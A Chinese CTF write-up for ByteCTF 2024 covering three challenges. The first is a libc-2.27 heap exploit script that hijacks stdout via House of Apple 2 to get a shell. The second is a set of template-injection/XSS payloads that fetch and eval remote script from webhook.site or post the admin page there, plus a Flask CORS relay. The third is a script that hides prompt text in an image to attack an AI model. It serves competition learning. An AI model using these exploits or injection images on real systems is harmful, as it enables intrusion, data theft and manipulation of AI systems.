---
title: 2024 ByteCTF 大师赛 writeup by Mini-Venom
contest: ByteCTF大师赛
year: 2024
difficulty: hard
vuln_type: [pwn_unknown, web_unknown, ssti, xss, stego_image]
tags: [libc-2.27, House of Apple 2, IO_FILE, wfile_jump, system, /bin/sh, Spring Boot Swagger, profileRegex, Go template, fetch webhook XSS, SSIM AI 图像攻击]
attack_chain: 堆布局 0x100+0x1000+0xc70+0xdb0+0x10 → off_by_null 改 size → 申请 0xdc0+0x10 → 0x1f1 fake prev_size 指向 stdout → 写 fake IO 走 _IO_wfile_jumps vtable → system("/bin/sh") → Spring Boot Swagger 找 /api/v1/users/updatePermission → profileRegex = ^.{0,80}$ 截断 profile 80 字符 → 模板注入 {{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/.../',{method:'POST',body:r}))}} → SSIM >0.9 判 AI 图像攻击
key_payload: flat({0x0:' sh', 0xa0:p64(stdout-0x130+0xd8), 0x10:p64(libc.symbols['system']), 0x20:p64(stdout), 0x98:p64(stdout-0x20+0x80), 0xd8:p64(wfile_jump+0x48-0x38), 0x60:'/bin/sh\x00', 0x80:p64(libc.symbols['system']), 0x88:p64(stdout-0x30), 0xe0:p64(stdout-8)}) ; {{fetch('https://webhook.site/...').then(a=>a.text().then(a=>eval(a)))}}
one_liner: House of Apple 2 改 stdout 劫持 + Spring Boot Swagger profileRegex 模板注入 + SSIM AI 图像攻击。
lesson: IO_FILE 链走 _IO_wfile_jumps 路径绕 vtable check 是 2.27+ 标配，profileRegex 长度截断要 double encode 注入。
quality: medium
---
# 2024 ByteCTF 大师赛 writeup by Mini-Venom

## 一、PWN（libc-2.27 House of Apple 2）

```python
add(0x100)              # 0
edit(0, 0x110, b'a'*0x108 + p64(0xca1))   # off_by_null 改 top chunk size
add(0x1000)             # 1
add(0xc70)              # 2
show(2)                 # 泄露 libc 0x3ebca0
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x3ebca0
stdout = libc.address + 0x3ec760
wfile_jump = libc.address + 0x3e7d60
add(0xdb0)              # 3
add(0x10)               # 4
edit(4, 0x20, b'a'*0x18 + p64(0x211))
add(0xdc0)              # 5
add(0x10)               # 6
edit(6, 0x20, b'a'*0x18 + p64(0x211))
add(0x1000)             # 7
edit(6, 0x28, b'a'*0x18 + p64(0x1f1) + p64(stdout))

fake_io = flat({
    0x00: b' sh',
    0xa0: p64(stdout - 0x130 + 0xd8),
    0x10: p64(libc.symbols['system']),
    0x20: p64(stdout),
    0x98: p64(stdout - 0x20 + 0x80),
    0xd8: p64(wfile_jump + 0x48 - 0x38),
    0x60: b'/bin/sh\x00',
    0x80: p64(libc.symbols['system']),
    0x88: p64(stdout - 0x30),
    0xe0: p64(stdout - 8),
}, filler=b'\x00')

add(0x1e0)              # 8
add(0x1e0)              # 9
edit(9, len(fake_io), fake_io)
p.interactive()
```

走 _IO_wfile_jumps + 0x48 偏移，触发 `__doallocate` → 调 `system("/bin/sh")`。

## 二、Web（Spring Boot Swagger + 模板注入 + 跨域 XSS）

```python
# /swagger-ui/index.html 找 /v3/api-docs/ → /api/v1/users/updatePermission
# profileRegex := regexp.MustCompile(`^.{0,80}$`)  # 80字符截断
```

Payload 注入用户 profile（80 字符内）：

```js
{{fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69').then(a=>a.text().then(a=>eval(a)))}}
{{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/.../',{method:'POST',body:r}))}}
```

后端用 Go template → 模板注入 → fetch 跨域 → admin bot 访问 /admin 触发 XSS。

外网 Flask 起 CORS 中转：

```python
from flask import Flask, Response
app = Flask(__name__)

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

@app.route('/')
def serve_js():
    return Response("{{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/.../',{method:'POST',body:r}))}}",
                    mimetype='application/javascript')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=19002)
```

## 三、AI 图像 SSIM 攻击

```python
from PIL import Image, ImageDraw, ImageFont
import numpy as np
from skimage.metrics import structural_similarity as ssim

origin_image = Image.open('origin.png').convert('RGB')
similar_image = origin_image.copy()
draw = ImageDraw.Draw(similar_image)
font_path = "/System/Library/Fonts/Supplemental/Arial.ttf"
font = ImageFont.truetype(font_path, 19)
text_color = (255, 255, 255)
text_position = (0, 0)

lines = []  # 构造多行 prompt
y_offset = 0
for line in lines:
    draw.text((text_position[0], text_position[1] + y_offset), line, font=font, fill=text_color)
    y_offset += font.size + 2

similar_image.save('attack.png')
origin_np = np.array(origin_image.convert('L'))
similar_np = np.array(similar_image.convert('L'))
score, _ = ssim(origin_np, similar_np, full=True)
print(f'SSIM: {score}')
if score > 0.9: print("OK")
else: print("Failed")
```

视觉相似度（SSIM > 0.9）但内容里嵌 prompt 文本，做 AI 模型对抗样本。
